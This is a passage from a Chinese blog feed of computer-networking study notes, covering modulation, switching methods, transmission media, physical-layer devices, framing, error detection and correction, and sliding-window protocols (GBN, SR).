title="数字数据调制为模拟信号"></a>数字数据调制为模拟信号</h3><p>数字数据调制技术在发送端将数字信号转换为模拟信号，而在接收端将模拟信号还原为数字信号，分别对应于调制解调器的调制和解调过程。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312142828014.png" alt="image-20240312142828014"></p><ul><li>调幅：为1时有幅度，为0时无幅度</li><li>调频：为0时频率较低，为1时频率较高</li><li>调相：即不同状态时波形的相位不同</li></ul><blockquote><p>还可以使用调幅+调相的组合方式(QAM)。</p></blockquote><p><strong>例题</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312143129934.png" alt="image-20240312143129934"></p><blockquote><p>这里相当于有4<em>4&#x3D;16种码元，也就是一码元传输四比特信息，所以是1200</em>4&#x3D;4800b&#x2F;s</p></blockquote><h3 id="模拟数据编码为数字信号"><a href="#模拟数据编码为数字信号" class="headerlink" title="模拟数据编码为数字信号"></a>模拟数据编码为数字信号</h3><p>计算机内部处理的是二进制数据，处理的都是数字音频，所以需要将模拟音频通过采样、量化转换成有限个数字表示的离散序列(即实现音频数字化)。</p><p>最典型的例子就是对音频信号进行编码的脉码调制(PCM)，在计算机应用中，能够达到最高保真水平的就是PCM编码，被广泛用于素材保存及音乐欣赏，CD、DVD以及我们常见的 WAV文件中均有应用。它主要包括三步:抽样、量化、编码</p><ol><li><p>抽样</p><p>对模拟信号周期性扫描，把时间上连续的信号变成时间上离散的信号。为了使所得的离散信号能无失真地代表被抽样的模拟数据，要使用采样定理进行采样:<strong>f(采样频率)<strong>大于等于</strong>2f(信号最高频率)</strong></p></li><li><p>量化</p><p>把抽样取得的电平幅值按照一定的分级标度转化为对应的数字值，并取整数，这就把连续的电平幅值转换为离散的数字量。</p></li><li><p>编码</p><p>把量化的结果转换为与之对应的二进制编码。</p></li></ol><h3 id="模拟数据调制为模拟信号"><a href="#模拟数据调制为模拟信号" class="headerlink" title="模拟数据调制为模拟信号"></a>模拟数据调制为模拟信号</h3><p>为了实现传输的有效性，可能需要较高的频率。这种调制方式还可以使用频分复用技术，充分利用带宽资源。在电话机和本地交换机所传输的信号是采用模拟信号传输模拟数据的方式;模拟的声音数据是加载到模拟的载波信号中传输的。</p><h1 id="数据交换方式"><a href="#数据交换方式" class="headerlink" title="数据交换方式"></a>数据交换方式</h1><p>有三种数据交换方式：</p><p><strong>电路交换</strong>、<strong>报文交换</strong>、<strong>分组交换</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312145450698.png" alt="image-20240312145450698"></p><h2 id="电路交换-Circuit-Exchanging"><a href="#电路交换-Circuit-Exchanging" class="headerlink" title="电路交换(Circuit Exchanging)"></a>电路交换(Circuit Exchanging)</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312145914210.png" alt="image-20240312145914210"></p><p>连接之后通信方式是全双工的。</p><p>释放连接的方式同理，发送释放连接请求然后等待确认响应。</p><p><strong>特点：</strong>独占资源，用户始终占用端到端的固定传输带宽。适用于远程批处理信息传输或系统间实时性要求高的大量数据传输的情况。</p><p><strong>电路交换优缺点</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312150144149.png" alt="image-20240312150144149"></p><h2 id="报文交换-Message-Exchanging"><a href="#报文交换-Message-Exchanging" class="headerlink" title="报文交换(Message Exchanging)"></a>报文交换(Message Exchanging)</h2><p><strong>报文：</strong>报文(message)是网络中交换与传输的数据单元，即站点一次性要发送的数据块。报文包含了将要发送的完整的数据信息，其长短很不一致，长度不限且可变。</p><p><strong>原理：</strong>无需在两个站点之间建立一条专用通路，其数据传输的单位是报文，传送过程采用存储转发方式。</p><p><strong>过程：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312150452238.png" alt="image-20240312150452238"></p><p><strong>优缺点：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312150532682.png" alt="image-20240312150532682"></p><h2 id="分组交换-Packet-Exchanging"><a href="#分组交换-Packet-Exchanging" class="headerlink" title="分组交换(Packet Exchanging)"></a>分组交换(Packet Exchanging)</h2><p><strong>分组：</strong>大多数计算机网络都不能连续地传送任意长的数据，所以实际上网络系统把数据分割成小块，然后逐块地发送，这种小块就称作分组(packet)。分组交换是现在网络中传输数据最常用的方式。</p><p><strong>分组交换的原理：</strong><br>分组交换与报文交换的工作方式基本相同，都采用存储转发方式，形式上的主要差别在于，分组交换网中要限制所传输的数据单位的长度，一般选128B。发送节点首先对从终端设备送来的数据报文进行接收存储，而后将报文划分成一定长度的分组，并以分组为单位进行传输和交换。接收结点将收到的分组组装成信息或报文。</p><p><strong>过程：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312150939221.png" alt="image-20240312150939221"></p><p><strong>优缺点</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312151003760.png" alt="image-20240312151003760"></p><h3 id="数据报方式"><a href="#数据报方式" class="headerlink" title="数据报方式"></a>数据报方式</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312151546362.png" alt="image-20240312151546362"></p><p><strong>特点</strong></p><ol><li><p>数据报方式为网络层提供无连接服务。发送方可随时发送分组，网络中的结点可随时接收分组。</p><p><strong>无连接服务：</strong>不事先为分组的传输确定传输路径，每个分组独立确定传输路径不同分组传输路径可能不同。</p></li><li><p>同一报文的不同分组达到目的结点时可能发生乱序、重复与丢失。</p></li><li><p>每个分组在传输过程中都必须携带源地址和目的地址，以及分组号。</p></li><li><p>分组在交换结点存储转发时，需要排队等候处理，这会带来一定的时延。当通过交换结点的通信量较大或网络发生拥塞时，这种时延会大大增加，交换结点还可根据情况丢弃部分分组。</p></li><li><p>网络具有冗余路径，当某一交换结点或一段链路出现故障时，可相应地更新转发表，寻找另一条路径转发分组，对故障的适应能力强，适用于突发性通信，不适于长报文，会话式通信。</p></li></ol><h3 id="虚电路方式"><a href="#虚电路方式" class="headerlink" title="虚电路方式"></a>虚电路方式</h3><p>虚电路将数据报方式和电路交换方式结合，以发挥两者优点。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312152224056.png" alt="image-20240312152224056"></p><p><strong>特点</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312152525446.png" alt="image-20240312152525446"></p><h3 id="数据报和虚电路对比"><a href="#数据报和虚电路对比" class="headerlink" title="数据报和虚电路对比"></a>数据报和虚电路对比</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312152559654.png" alt="image-20240312152559654"></p><h2 id="交换方式的选择"><a href="#交换方式的选择" class="headerlink" title="交换方式的选择"></a>交换方式的选择</h2><ol><li><p>传送数据量大，且传送时间远大于呼叫时，选择电路交换。电路交换传输时延最小。</p></li><li><p>当端到端的通路有很多段的链路组成时,采用分组交换传送数据较为合适。</p></li><li><p>从信道利用率上看，报文交换和分组交换优于电路交换，其中分组交换比报文交换的时延小，尤其适合于计算机之间的突发式的数据通信。</p></li></ol><h1 id="物理层传输介质"><a href="#物理层传输介质" class="headerlink" title="物理层传输介质"></a>物理层传输介质</h1><p>传输介质也称传输媒体&#x2F;传输媒介，它就是数据传输系统中在发送设备和接收设备之间的<strong>物理通路</strong>。</p><p><strong>传输媒体并不是物理层</strong>，传输媒体在物理层的下面，因为物理层是体系结构的第一层，因此有时称传输媒体为0层。在传输媒体中传输的是信号，但传输媒体并不知道所传输的信号代表什么意思。但物理层规定了电气特性，因此能够识别所传送的比特流。</p><p><strong>传输介质</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312152930074.png" alt="image-20240312152930074"></p><h2 id="导向型传输介质"><a href="#导向型传输介质" class="headerlink" title="导向型传输介质"></a>导向型传输介质</h2><h3 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h3><p>双绞线是古老、又最常用的传输介质，它由两根采用一定规则并排绞合的、相互绝缘的铜导线组成。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312153151300.png" alt="image-20240312153151300"></p><blockquote><p>双绞线价格便宜，是最常用的传输介质之一，在局域网和传统电话网中普遍使用。模拟传输和数字传输都可以使用双绞线，其通信距离一般为几公里到数十公里。距离太远时，对于模拟传输，要用放大器放大衰减的信号;对于数字传输，要用中继器将失真的信号整形。</p></blockquote><h3 id="同轴电缆"><a href="#同轴电缆" class="headerlink" title="同轴电缆"></a>同轴电缆</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312153436424.png" alt="image-20240312153436424"></p><h3 id="光纤"><a href="#光纤" class="headerlink" title="光纤"></a>光纤</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312153803723.png" alt="image-20240312153803723"></p><p><strong>单模光纤和多模光纤</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312153940233.png" alt="image-20240312153940233"></p><p><strong>光纤的特点</strong></p><p>1.传输损耗小，中继距离长，对远距离传输特别经济。</p><p>2.抗雷电和电磁干扰性能好。</p><p>3.无串音干扰，保密性好，也不易被窃听或截取数据。</p><p>4.体积小，重量轻。</p><h2 id="非导向型传输介质"><a href="#非导向型传输介质" class="headerlink" title="非导向型传输介质"></a>非导向型传输介质</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312154418577.png" alt="image-20240312154418577"></p><p>微波就是利用中继器进行接力通信</p><h1 id="物理层设备"><a href="#物理层设备" class="headerlink" title="物理层设备"></a>物理层设备</h1><h2 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h2><p><strong>诞生原因：</strong>由于存在损耗，在线路上传输的信号功率会逐渐衰减，衰减到一定程度时将造成信号失真，因此会导致接收错误。</p><p><strong>中继器的功能：</strong>对信号进行&#x3D;&#x3D;再生和还原&#x3D;&#x3D;，对衰减的信号进行放大，保持与原数据相同，以增加信号传输的距离，延长网络的长度。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312154708719.png" alt="image-20240312154708719"></p><p><strong>中继器的两端：</strong>两端的网络部分是网段，而不是子网，适用于完全相同的两类网络的互连，且两个网段速率要相同。</p><p>中继器只将任何电缆段上的数据发送到另一段电缆上，它仅作用于信号的电气部分，并不管数据中是否有错误数据或不适于网段的数据。</p><p>两端可连相同媒体，也可连不同媒体。</p><p>中继器两端的网段一定要是同一个协议，因为中继器不会存储转发。</p><p><strong>5-4-3规则：</strong>网络标准中都对信号的延迟范围作了具体的规定，因而中继器只能在规定的范围内进行，否则会网络故障。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312155118594.png" alt="image-20240312155118594"></p><p>比如10M以太网中的5-4-3规则：</p><ol><li><p>5 个网段 : 中继器连接的网络中 , 只允许最多有5个网段 , 每个中继器 两端可以有两个网段 。</p></li><li><p>4 个中继器 : 5个网段内 , 最多有4个中继器 。</p></li><li><p>3 个计算机挂载点 : 只有3个网段可以挂载计算机 。</p></li></ol><h2 id="集线器-多口中继器"><a href="#集线器-多口中继器" class="headerlink" title="集线器(多口中继器)"></a>集线器(多口中继器)</h2><p><strong>功能：</strong>对信号进行再生放大转发，对衰减的信号进行放大，接着转发到其他所有(除输入端口外)处于工作状态的端口上，以增加信号传输的距离，延长网络的长度。不具备信号的定向传送能力，是一个共享式设备。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312155755183.png" alt="image-20240312155755183"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 计网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-5</title>
      <link href="/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-5/"/>
      <url>/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-5/</url>
      
        <content type="html"><![CDATA[<h1 id="数据链路层概述"><a href="#数据链路层概述" class="headerlink" title="数据链路层概述"></a>数据链路层概述</h1><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319002608096.png" alt="image-20240319002608096"></p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>结点</strong>：主机、路由器。</p><p><strong>链路</strong>：网络中两个结点之间的物理通道，链路的传输介质主要有双绞线、光纤和微波。分为有线链路、无线链路。</p><p><strong>数据链路</strong>：网络中两个结点之间的逻辑通道，把实现控制数据传输协议的硬件和软件加到链路上就构成数据链路。</p><p><strong>帧</strong>：链路层的协议数据单元，封装网络层数据报。</p><h2 id="功能概述"><a href="#功能概述" class="headerlink" title="功能概述"></a>功能概述</h2><p>数据链路层在物理层提供服务的基础上向网络层提供服务，其最基本的服务是将源自网络层来的数据可靠地传输到相邻节点的目标机网络层。其主要作用是加强物理层传输原始比特流的功能，将物理层提供的可能出错的物理连接改造成为逻辑上无差错的数据链路，使之对网络层表现为一条无差错的链路。</p><p><strong>功能一</strong>：为网络层提供服务。无确认无连接服务，有确认无连接服务，有确认面向连接服务。</p><p><strong>功能二</strong>：链路管理，即连接的建立、维持、释放(用于面向连接的服务)。</p><p><strong>功能三</strong>：组帧。</p><p><strong>功能四</strong>：流量控制。</p><p><strong>功能五</strong>：差错控制（帧错&#x2F;位错）</p><h1 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h1><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319003822417.png" alt="image-20240319003822417"></p><h2 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h2><p>透明传输是指不管所传数据是什么样的比特组合，都应当能够在链路上传送。因此，链路层就“看不见”有什么妨碍数据传输的东西。<br>当所传数据中的比特组合恰巧与某一个控制信息完全一样时，就必须采取适当的措施，使收方不会将这样的数据误认为是某种控制信息。这样才能保证数据链路层的传输是透明的。</p><h2 id="四种组帧方法"><a href="#四种组帧方法" class="headerlink" title="四种组帧方法"></a>四种组帧方法</h2><h3 id="字符计数法"><a href="#字符计数法" class="headerlink" title="字符计数法"></a>字符计数法</h3><p>帧首部使用一个计数字段(第一个字节，八位)来标明帧内字符数</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319004252864.png" alt="image-20240319004252864"></p><p>但是这样万一其中一个字符数错了，会导致后面所有都出现错误，所以该方法不常用。</p><h3 id="字符填充法"><a href="#字符填充法" class="headerlink" title="字符填充法"></a>字符填充法</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319004625498.png" alt="image-20240319004625498"></p><p>如上图在数据传输过程中可能会遇到在数据部分有控制字符导致接收方错误判断帧边界，所以可以用下面的字符填充法，有点类似编程语言中的转义字符。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319004800029.png" alt="image-20240319004800029"></p><p>发送时在控制字符前添加转义字符ESC，接收时就把所有转义字符去掉</p><h3 id="零比特填充法"><a href="#零比特填充法" class="headerlink" title="零比特填充法"></a>零比特填充法</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319005002833.png" alt="image-20240319005002833"></p><h3 id="违规编码法"><a href="#违规编码法" class="headerlink" title="违规编码法"></a>违规编码法</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319005216244.png" alt="image-20240319005216244"></p><p>我们可以知道在物理层的曼彻斯特编码中的码元要不就高-低或者低-高，高-高和低-低是不可能出现的，所以这两种就是违规的编码，这样我们就可以用来界定帧的起始和终止而不会重复，非常的稳妥。</p><blockquote><p>由于字节计数法中Count字段的脆弱性(其值若有差错将导致灾难性后果)及字符填充实现上的复杂性和不兼容性，目前较普遍使用的帧同步法是比特填充和违规编码法。</p></blockquote><h1 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h1><h2 id="差错控制介绍"><a href="#差错控制介绍" class="headerlink" title="差错控制介绍"></a>差错控制介绍</h2><p>概括来说，传输中的差错主要是由于噪声引起的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319092243604.png" alt="image-20240319092243604"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319092442403.png" alt="image-20240319092442403"></p><h2 id="检错编码"><a href="#检错编码" class="headerlink" title="检错编码"></a>检错编码</h2><p><strong>奇偶校验码</strong></p><ol><li>奇校验码就是比特中1的个数为奇数</li><li>偶校验码就是比特中1的个数为偶数</li></ol><blockquote><p>但是这种校验方式如果出现偶数个比特出错就校验不出来了，因为会和原比特流的奇偶性一致。</p></blockquote><p><strong>CRC循环冗余码</strong></p><p>这里有点类似于用除法和余数的关系来检测数据，下面是一个简单的除法来解释crc冗余码的原理</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319181343240.png" alt="image-20240319181343240"></p><p>比如有一个1101的除数，那他的生成多项式就是：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319181544775.png" alt="image-20240319181544775"></p><p>下面是一个计算FCS的例子：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319181821496.png" alt="image-20240319181821496"></p><blockquote><p>FCS的生成以及接收端CRC检验都是由硬件实现，处理很迅速因此不会延误数据的传输</p></blockquote><p>链路层使用CRC检验，能够实现无比特差错的传输，但这还不是可靠传输，因为有些帧被丢弃了。</p><h2 id="纠错编码"><a href="#纠错编码" class="headerlink" title="纠错编码"></a>纠错编码</h2><p>海明码可以发现错误并找到位置，最后纠正错误</p><p><strong>工作流程</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319094010233.png" alt="image-20240319094010233"></p><p><strong>海明距离(码距)</strong></p><p>两个合法编码(码字)的对应比特取值不同的比特数称为这两个码字的海明距离(码距)，一个有效编码集中,任意两个合法编码(码字)的海明距离的最小值称为该编码集的海明距离(码距)。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319174734678.png" alt="image-20240319174734678"></p><p>比如左边第一个000和001有一个比特位不一样同时也是最小的，所以码距为1，同理右边这个为2；</p><p>所以当码距为d时，要检查出错误的话就只能检测出d-1位，因为如果有d位出错的话可能变成一个正确的编码，这样就无法判断了。</p><p>而想要纠错d位的话就要2d+1码距了。</p><h3 id="确定校验码位数r"><a href="#确定校验码位数r" class="headerlink" title="确定校验码位数r"></a>确定校验码位数r</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182311727.png" alt="image-20240319182311727"></p><h3 id="确定校验码和数据的位置"><a href="#确定校验码和数据的位置" class="headerlink" title="确定校验码和数据的位置"></a>确定校验码和数据的位置</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182425486.png" alt="image-20240319182425486"></p><h3 id="求出校验码的值"><a href="#求出校验码的值" class="headerlink" title="求出校验码的值"></a>求出校验码的值</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182555883.png" alt="image-20240319182555883"></p><h3 id="检错并纠错"><a href="#检错并纠错" class="headerlink" title="检错并纠错"></a>检错并纠错</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182901466.png" alt="image-20240319182901466"></p><p><strong>纠错方法一</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182927374.png" alt="image-20240319182927374"></p><p><strong>纠错方法二</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182949728.png" alt="image-20240319182949728"></p><h1 id="流量控制与可靠传输机制"><a href="#流量控制与可靠传输机制" class="headerlink" title="流量控制与可靠传输机制"></a>流量控制与可靠传输机制</h1><p>较高的发送速度和较低的接收能力的不匹配，会造成传输出错，因此流量控制也是数据链路层的一项重要工作。</p><p><strong>传输层和链路层流量控制的区别</strong></p><p>数据链路层时点对点的(指两个相邻节点)，传输层是端到端的(指两个主机之间)</p><p>数据链路层流量控制手段:接收方收不下就不回复确认。</p><p>传输层流量控制手段:接收端给发送端一个窗口公告。</p><p><strong>流量控制的方法</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320004554062.png" alt="image-20240320004554062"></p><p>所谓的滑动窗口就是接收方收到数据往后移动一帧，发送方收到确认就往后移动一帧；</p><p>停止-等待协议也可以看做是一个窗口为1的特殊的滑动窗口协议</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320004750636.png" alt="image-20240320004750636"></p><p>数据链路层的滑动窗口在传输过程中都是确定的，而传输层则不一定</p><p><strong>可靠传输、滑动窗口、流量控制</strong></p><p>可靠传输：发送端发啥，接收端收啥</p><p>流量控制：控制发送速率，使接收方有足够的缓冲空间来接收每一个帧。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320005114497.png" alt="image-20240320005114497"></p><h2 id="停止等待协议"><a href="#停止等待协议" class="headerlink" title="停止等待协议"></a>停止等待协议</h2><p><strong>停止等待协议的目的</strong></p><p>除了比特出差错，底层信道还会出现丢包问题。为了实现流量控制。</p><p><strong>前提</strong></p><p>“停止-等待”就是每发送完一个分组就停止发送，等待对方确认，在收到确认后再发送下一个分组。</p><p><strong>应用情况分为两种</strong></p><p>无差错情况&amp;有差错情况</p><h3 id="无差错情况"><a href="#无差错情况" class="headerlink" title="无差错情况"></a>无差错情况</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321081756032.png" alt="image-20240321081756032"></p><p>0号帧只是编号一样，两个帧是不一样的</p><h3 id="有差错情况"><a href="#有差错情况" class="headerlink" title="有差错情况"></a>有差错情况</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321082020356.png" alt="image-20240321082020356"></p><ol><li><p>发完一个帧后，必须保留它的副本。</p></li><li><p>数据帧和确认帧必须编号。</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321082242961.png" alt="image-20240321082242961"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321082347053.png" alt="image-20240321082347053"></p><p>此时若在收到重传确认0号帧之前收到了之前迟到的确认0号帧，在收到重传确认帧之后也会将其丢弃。</p><h3 id="信道利用率"><a href="#信道利用率" class="headerlink" title="信道利用率"></a>信道利用率</h3><p><strong>定义</strong></p><p>发送方在一个发送周期内，有效地发送数据所需要的时间占整个发送周期的比率。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321082926486.png" alt="image-20240321082926486"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321082757357.png" alt="image-20240321082757357"></p><p><strong>例题</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321083051546.png" alt="image-20240321083051546"></p><h2 id="后退N帧协议-GBN协议"><a href="#后退N帧协议-GBN协议" class="headerlink" title="后退N帧协议(GBN协议)"></a>后退N帧协议(GBN协议)</h2><p><strong>后退N帧协议中的滑动窗口</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328005017907.png" alt="image-20240328005017907"></p><p>这里的接收窗口为一，发送窗口有多个</p><p>当发送窗口或者接收窗口确认发送或者接收之后就会向下滑动。</p><p>后退N帧还有一个不同于停止等待的特点就是他可以累计确认，就是不需要每一帧都发送确认，比如在收到3号帧的时候才发送确认帧代表前面都是正常接收到的。</p><p><strong>GBN发送方需要响应的三件事</strong></p><ol><li><p>上层的调用</p><p>上层要发送数据时，发送方先检查发送窗口是否已满，如果未满，则产生一个帧并将其发送；如果窗口己满发送方只需将数据返回给上层，暗示上层窗口己满。上层等一会再发送。(实际实现中，发送方可以缓存这些数据，窗口不满时再发送帧)。</p></li><li><p>收到了一个ACK确认帧</p><p>GBN协议中，对n号帧的确认采用累积确认的方式，标明接收方已经收到n号帧和它之前的全部帧。</p></li><li><p>超时事件</p><p>协议的名字为后退N帧&#x2F;回退N帧，来源于出现丢失和时延过长帧时发送方的行为。就像在停等协议中一样定时器将再次用于恢复数据帧或确认帧的丢失。如果出现超时，发送方重传所有已己发送但未被确认的帧。</p><blockquote><p>比如发送方发送了一个1号帧但是丢失了，后续继续发送2、3、4号帧，但是接收方接收到0号帧之后会等待接收1号帧，但是来的是非1号帧他就会丢弃；所以导致双方都在等待，超过一段时间后发送方就会重传之前1号帧包括1号帧发送之后的数据。</p></blockquote></li></ol><p><strong>GBN接收方需要做的事</strong></p><p> <img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328152503951.png" alt="image-20240328152503951"></p><p><strong>整个GBN协议的流程图</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328152727575.png" alt="image-20240328152727575"></p><p><strong>滑动窗口的长度</strong></p><p>若采用n比特对帧编号，那么发送窗口的尺寸W，应满足:1≤ W≤2^n-1。因为发送窗口尺寸过大，就会使得接收方无法区别新帧和旧帧。</p><h2 id="选择重传协议-SR"><a href="#选择重传协议-SR" class="headerlink" title="选择重传协议(SR)"></a>选择重传协议(SR)</h2><p><strong>GBN协议的弊端</strong></p><p>由于累计确认的原因，已发送过的帧也要重传就浪费了很多资源。</p><p><strong>解决办法：</strong>设置单个确认，同时加大接收窗口，设置接收缓存，缓存乱序到达的帧。</p><p><strong>这是两个有关SR的滑动窗口例子</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331155314314.png" alt="image-20240331155314314"></p><h3 id="SR发送方要做的事"><a href="#SR发送方要做的事" class="headerlink" title="SR发送方要做的事"></a>SR发送方要做的事</h3><ol><li><p>上层的调用<br>从上层收到数据后，SR发送方检查下一个可用于该帧的序号，如果序号位于发送窗口内，则发送数据帧;否则就像GBN一样，要么将数据缓存，要么返回给上层之后再传输。</p></li><li><p>收到了一个ACK<br>如果收到ACK，加入该帧序号在窗口内，则SR发送方将那个被确认的帧标记为已接收。如果该帧序号是窗口的下界(最左边第一个窗口对应的序号)，则窗口向前移动到具有最小序号的未确认帧处。如果窗口移动了并且有序号在窗口内的未发送帧，则发送这些帧。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331155626452.png" alt="image-20240331155626452"></p></li><li><p>超时事件<br>每个帧都有自己的定时器，一个超时事件发生后只重传一个帧。</p></li></ol><h3 id="SR接收方要做的事"><a href="#SR接收方要做的事" class="headerlink" title="SR接收方要做的事"></a>SR接收方要做的事</h3><p>SR接收方将确认一个正确接收的帧而不管其是否按序。失序的帧将被缓存，并返回给发送方一个该帧的确认帧【收谁确认谁】，直到所有(即序号更小的帧)皆被收到为止，这时才可以将一批帧按序交付给上层，然后向前移动滑动窗口。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331155942903.png" alt="image-20240331155942903"></p><p>如果收到了窗口序号之外的帧，就返回一个ACK，不过这个帧是要小于下界的帧，因为前面的帧都是已经接收过的，可能在发送ACK确认帧的时候丢失了，导致触发了超时重传。</p><h3 id="运行中的SR的流程图"><a href="#运行中的SR的流程图" class="headerlink" title="运行中的SR的流程图"></a>运行中的SR的流程图</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331160353171.png" alt="image-20240331160353171"></p><p> <strong>窗口长度限制</strong></p><p>窗口长度过长会导致二义性的问题，即接收方无法区分是新帧还是旧帧，发送窗口的大小最好等于接收窗口</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331160748621.png" alt="image-20240331160748621"></p><blockquote><p>n是比特位数</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331160808971.png" alt="image-20240331160808971"></p><p><strong>SR协议总结</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331161019994.png" alt="image-20240331161019994"></p><h1 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h1><p><strong>传输数据使用的两种链路</strong></p><ol><li><p>点对点链路：两个相邻节点通过一个链路相连，没有第三者；</p><p>应用：PPP协议，常用于广域网。</p></li><li><p>广播式链路：所有主机共享通信介质；</p><p>应用：早期的总线以太网、无线局域网，常用于局域网</p><p>典型拓扑结构：总线型、星型(逻辑总线型)</p></li></ol><p><strong>介质访问控制</strong></p><p>就是采取一定的措施，使得两对节点之间的通信不会发生互相干扰的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331223817687.png" alt="image-20240331223817687"></p><blockquote><p>动态分配的特点：信道并非在用户通信时固定分配给用户。</p><p>三种访问控制协议中只有随机访问会发生冲突</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401001558136.png" alt="image-20240401001558136"></p><h2 id="信道划分介质访问控制"><a href="#信道划分介质访问控制" class="headerlink" title="信道划分介质访问控制"></a>信道划分介质访问控制</h2><p>使用介质的每个设备与来自同一信道上的其他设备的通信隔离开，把时域和频域资源合理地分配给网络上的设备。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331224034767.png" alt="image-20240331224034767"></p><h3 id="FDM"><a href="#FDM" class="headerlink" title="FDM"></a>FDM</h3><p><strong>频分多路复用</strong></p><p>用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。频分复用的所有用户在同样的时间占用不同的带宽(频率带宽)资源。</p><p>充分利用传输介质带宽，系统效率较高:由于技术比较成熟，实现也比较容易。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331224236833.png" alt="image-20240331224236833"></p><h3 id="TDM"><a href="#TDM" 